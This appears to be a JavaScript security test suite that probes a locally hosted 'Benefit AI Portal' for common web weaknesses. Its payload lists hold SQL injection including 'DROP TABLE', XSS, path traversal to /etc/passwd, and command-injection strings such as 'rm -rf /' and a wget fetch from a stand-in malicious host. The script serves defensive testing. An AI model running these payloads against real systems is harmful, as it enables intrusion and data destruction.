const axios = require('axios');
const crypto = require('crypto');

// Security test configuration
const config = {
  baseURL: 'http://localhost:8081/benefit-ai-portal/',
  timeout: 10000,
  headers: {
    'User-Agent': 'Benefit-AI-Portal-Security-Test/1.0'
  }
};

// Test payloads for various attacks
const attackPayloads = {
  // SQL Injection attempts
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "1' OR '1' = '1' --",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --"
  ],

  // XSS attempts
  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')>"
  ],

  // NoSQL Injection attempts
  nosqlInjection: [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
    '{"$regex": ".*"}',
    '{"$exists": true}'
  ],

  // Command Injection attempts
  commandInjection: [
    "; ls -la",
    "| cat /etc/passwd",
    "&& rm -rf /",
    "; whoami",
    "| wget http://malicious.com/script.sh"
  ],

  // Path Traversal attempts
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  ],

  // LDAP Injection attempts
  ldapInjection: [
    "*)(uid=*))(|(uid=*",
    "*))%00",
    "admin)(&(password=*))",
    "*)(|(password=*))"
  ]
};

// Security test results
class SecurityTestResults {
  constructor() {
    this.results = {
      passed: 0,
      failed: 0,
      warnings: 0,
      vulnerabilities: []
    };
  }

  addResult(test, status, details = null) {
    if (status === 'PASS') {
      this.results.passed++;
      console.log(`✅ ${test}: PASSED`);
    } else if (status === 'FAIL') {
      this.results.failed++;
      this.results.vulnerabilities.push({ test, details });
      console.log(`❌ ${test}: FAILED - ${details}`);
    } else if (status === 'WARN') {
      this.results.warnings++;
      console.log(`⚠️ ${test}: WARNING - ${details}`);
    }
  }

  generateReport() {
    console.log('\n🔒 BENEFIT AI PORTAL - SECURITY TEST REPORT');
    console.log('=' .repeat(55));
    
    console.log(`\n📊 Test Results:`);
    console.log(`   Passed: ${this.results.passed}`);
    console.log(`   Failed: ${this.results.failed}`);
    console.log(`   Warnings: ${this.results.warnings}`);
    
    const totalTests = this.results.passed + this.results.failed + this.results.warnings;
    const passRate = ((this.results.passed / totalTests) * 100).toFixed(2);
    
    console.log(`   Pass Rate: ${passRate}%`);
    
    if (this.results.vulnerabilities.length > 0) {
      console.log(`\n🚨 VULNERABILITIES FOUND:`);
      this.results.vulnerabilities.forEach(vuln => {
        console.log(`   - ${vuln.test}: ${vuln.details}`);
      });
    }
    
    // Security grade
    const grade = this.calculateSecurityGrade();
    console.log(`\n🛡️ Security Grade: ${grade}`);
  }

  calculateSecurityGrade() {
    const totalTests = this.results.passed + this.results.failed + this.results.warnings;
    const passRate = this.results.passed / totalTests;
    
    if (passRate >= 0.95 && this.results.failed === 0) return '🟢 EXCELLENT';
    if (passRate >= 0.90 && this.results.failed <= 2) return '🟡 GOOD';
    if (passRate >= 0.80 && this.results.failed <= 5) return '🟠 ACCEPTABLE';
    return '🔴 POOR';
  }
}

// Authentication security tests
async function testAuthentication() {
  console.log('\n🔐 Testing Authentication Security...');
  const results = new SecurityTestResults();

  try {
    // Test weak password policy
    const weakPasswords = ['123456', 'password', 'admin', 'qwerty'];
    for (const password of weakPasswords) {
      try {
        await axios.post(`${config.baseURL}/api/auth/login`, {
          email: 'test@example.com',
          password: password
        });
        results.addResult('Weak Password Policy', 'WARN', `Weak password accepted: ${password}`);
      } catch (error) {
        results.addResult('Weak Password Policy', 'PASS');
      }
    }

    // Test brute force protection
    for (let i = 0; i < 10; i++) {
      try {
        await axios.post(`${config.baseURL}/api/auth/login`, {
          email: 'test@example.com',
          password: 'wrongpassword'
        });
      } catch (error) {
        if (error.response?.status === 429) {
          results.addResult('Brute Force Protection', 'PASS');
          break;
        }
      }
    }

    // Test JWT token security
    const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
    try {
      await axios.get(`${config.baseURL}/api/user/profile`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      results.addResult('JWT Token Validation', 'FAIL', 'Invalid token accepted');
    } catch (error) {
      results.addResult('JWT Token Validation', 'PASS');
    }

  } catch (error) {
    results.addResult('Authentication Tests', 'WARN', 'Some tests could not be completed');
  }

  return results;
}

// Input validation security tests
async function testInputValidation() {
  console.log('\n🔍 Testing Input Validation...');
  const results = new SecurityTestResults();

  try {
    // Test SQL Injection
    for (const payload of attackPayloads.sqlInjection) {
      try {
        await axios.post(`${config.baseURL}/api/auth/login`, {
          email: payload,
          password: 'test'
        });
        results.addResult('SQL Injection Protection', 'FAIL', `SQL injection payload accepted: ${payload}`);
      } catch (error) {
        results.addResult('SQL Injection Protection', 'PASS');
      }
    }

    // Test XSS
    for (const payload of attackPayloads.xss) {
      try {
        await axios.post(`${config.baseURL}/api/user/feedback`, {
          message: payload
        });
        results.addResult('XSS Protection', 'FAIL', `XSS payload accepted: ${payload}`);
      } catch (error) {
        results.addResult('XSS Protection', 'PASS');
      }
    }

    // Test NoSQL Injection
    for (const payload of attackPayloads.nosqlInjection) {
      try {
        await axios.get(`${config.baseURL}/api/users?filter=${encodeURIComponent(payload)}`);
        results.addResult('NoSQL Injection Protection', 'FAIL', `NoSQL injection payload accepted: ${payload}`);
      } catch (error) {
        results.addResult('NoSQL Injection Protection', 'PASS');
      }
    }

  } catch (error) {
    results.addResult('Input Validation Tests', 'WARN', 'Some tests could not be completed');
  }

  return results;
}

// Authorization security tests
async function testAuthorization() {
  console.log('\n🔑 Testing Authorization...');
  const results = new SecurityTestResults();

  try {
    // Test unauthorized access to admin endpoints
    const adminEndpoints = [
      '/api/admin/users',
      '/api/admin/analytics',
      '/api/admin/settings'
    ];

    for (const endpoint of adminEndpoints) {
      try {
        await axios.get(`${config.baseURL}${endpoint}`);
        results.addResult('Admin Endpoint Protection', 'FAIL', `Unauthorized access to: ${endpoint}`);
      } catch (error) {
        if (error.response?.status === 401 || error.response?.status === 403) {
          results.addResult('Admin Endpoint Protection', 'PASS');
        }
      }
    }

    // Test horizontal privilege escalation
    try {
      await axios.get(`${config.baseURL}/api/users/123/profile`);
      results.addResult('Horizontal Privilege Escalation', 'FAIL', 'Access to other user profile');
    } catch (error) {
      results.addResult('Horizontal Privilege Escalation', 'PASS');
    }

  } catch (error) {
    results.addResult('Authorization Tests', 'WARN', 'Some tests could not be completed');
  }

  return results;
}

// Data protection security tests
async function testDataProtection() {
  console.log('\n🔒 Testing Data Protection...');
  const results = new SecurityTestResults();

  try {
    // Test HTTPS enforcement
    const httpUrl = config.baseURL.replace('https://', 'http://');
    try {
      await axios.get(httpUrl);
      results.addResult('HTTPS Enforcement', 'WARN', 'HTTP access allowed');
    } catch (error) {
      results.addResult('HTTPS Enforcement', 'PASS');
    }

    // Test sensitive data exposure
    try {
      const response = await axios.get(`${config.baseURL}/api/user/profile`);
      const data = response.data;
      
      if (data.password || data.creditCard || data.ssn) {
        results.addResult('Sensitive Data Exposure', 'FAIL', 'Sensitive data exposed in response');
      } else {
        results.addResult('Sensitive Data Exposure', 'PASS');
      }
    } catch (error) {
      results.addResult('Sensitive Data Exposure', 'PASS');
    }

    // Test secure headers
    try {
      const response = await axios.get(config.baseURL);
      const headers = response.headers;
      
      const requiredHeaders = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection',
        'Strict-Transport-Security'
      ];

      for (const header of requiredHeaders) {
        if (!headers[header.toLowerCase()]) {
          results.addResult('Security Headers', 'WARN', `Missing header: ${header}`);
        }
      }
      
      if (requiredHeaders.every(header => headers[header.toLowerCase()])) {
        results.addResult('Security Headers', 'PASS');
      }
    } catch (error) {
      results.addResult('Security Headers', 'WARN', 'Could not check security headers');
    }

  } catch (error) {
    results.addResult('Data Protection Tests', 'WARN', 'Some tests could not be completed');
  }

  return results;
}

// API security tests
async function testAPISecurity() {
  console.log('\n🌐 Testing API Security...');
  const results = new SecurityTestResults();

  try {
    // Test CORS configuration
    try {
      const response = await axios.get(`${config.baseURL}/api/users`, {
        headers: {
          'Origin': 'http://malicious-site.com'
        }
      });
      results.addResult('CORS Configuration', 'WARN', 'CORS may be too permissive');
    } catch (error) {
      results.addResult('CORS Configuration', 'PASS');
    }

    // Test rate limiting
    const requests = [];
    for (let i = 0; i < 100; i++) {
      requests.push(axios.get(`${config.baseURL}/api/users`));
    }

    try {
      await Promise.all(requests);
      results.addResult('Rate Limiting', 'WARN', 'No rate limiting detected');
    } catch (error) {
      if (error.response?.status === 429) {
        results.addResult('Rate Limiting', 'PASS');
      }
    }

    // Test parameter pollution
    try {
      await axios.get(`${config.baseURL}/api/users?id=1&id=2`);
      results.addResult('Parameter Pollution', 'WARN', 'Parameter pollution not handled');
    } catch (error) {
      results.addResult('Parameter Pollution', 'PASS');
    }

  } catch (error) {
    results.addResult('API Security Tests', 'WARN', 'Some tests could not be completed');
  }

  return results;
}

// Penetration testing simulation
async function runPenetrationTests() {
  console.log('\n⚔️ Running Penetration Tests...');
  const results = new SecurityTestResults();

  try {
    // Test for common vulnerabilities
    const commonVulns = [
      { name: 'Directory Traversal', path: '/../../../etc/passwd' },
      { name: 'File Inclusion', path: '/?file=../../../etc/passwd' },
      { name: 'Command Injection', path: '/?cmd=ls' },
      { name: 'SSRF', path: '/?url=http://internal-server' }
    ];

    for (const vuln of commonVulns) {
      try {
        await axios.get(`${config.baseURL}${vuln.path}`);
        results.addResult(vuln.name, 'FAIL', `Vulnerability found: ${vuln.path}`);
      } catch (error) {
        results.addResult(vuln.name, 'PASS');
      }
    }

    // Test for information disclosure
    try {
      const response = await axios.get(`${config.baseURL}/api/error`);
      if (response.data.stack || response.data.error) {
        results.addResult('Information Disclosure', 'WARN', 'Error details exposed');
      } else {
        results.addResult('Information Disclosure', 'PASS');
      }
    } catch (error) {
      results.addResult('Information Disclosure', 'PASS');
    }

  } catch (error) {
    results.addResult('Penetration Tests', 'WARN', 'Some tests could not be completed');
  }

  return results;
}

// Main security test runner
async function runSecurityTests() {
  console.log('🛡️ BENEFIT AI PORTAL - COMPREHENSIVE SECURITY TESTING');
  console.log('=' .repeat(60));
  console.log('Testing: Authentication, Input Validation, Authorization, Data Protection, API Security, Penetration\n');

  const allResults = new SecurityTestResults();

  try {
    // Run all security tests
    const authResults = await testAuthentication();
    const inputResults = await testInputValidation();
    const authzResults = await testAuthorization();
    const dataResults = await testDataProtection();
    const apiResults = await testAPISecurity();
    const pentestResults = await runPenetrationTests();

    // Combine results
    allResults.results.passed = authResults.results.passed + inputResults.results.passed + 
                               authzResults.results.passed + dataResults.results.passed + 
                               apiResults.results.passed + pentestResults.results.passed;
    
    allResults.results.failed = authResults.results.failed + inputResults.results.failed + 
                               authzResults.results.failed + dataResults.results.failed + 
                               apiResults.results.failed + pentestResults.results.failed;
    
    allResults.results.warnings = authResults.results.warnings + inputResults.results.warnings + 
                                 authzResults.results.warnings + dataResults.results.warnings + 
                                 apiResults.results.warnings + pentestResults.results.warnings;
    
    allResults.results.vulnerabilities = [
      ...authResults.results.vulnerabilities,
      ...inputResults.results.vulnerabilities,
      ...authzResults.results.vulnerabilities,
      ...dataResults.results.vulnerabilities,
      ...apiResults.results.vulnerabilities,
      ...pentestResults.results.vulnerabilities
    ];

    // Generate final report
    allResults.generateReport();
    
    console.log('\n✅ Security testing completed!');
    console.log('🔍 Review the results above for any security issues.');
    
  } catch (error) {
    console.error('\n❌ Security tests failed:', error.message);
    process.exit(1);
  }
}

// Export for use in other test files
module.exports = {
  testAuthentication,
  testInputValidation,
  testAuthorization,
  testDataProtection,
  testAPISecurity,
  runPenetrationTests,
  runSecurityTests
};

// Run tests if this file is executed directly
if (require.main === module) {
  runSecurityTests();
} 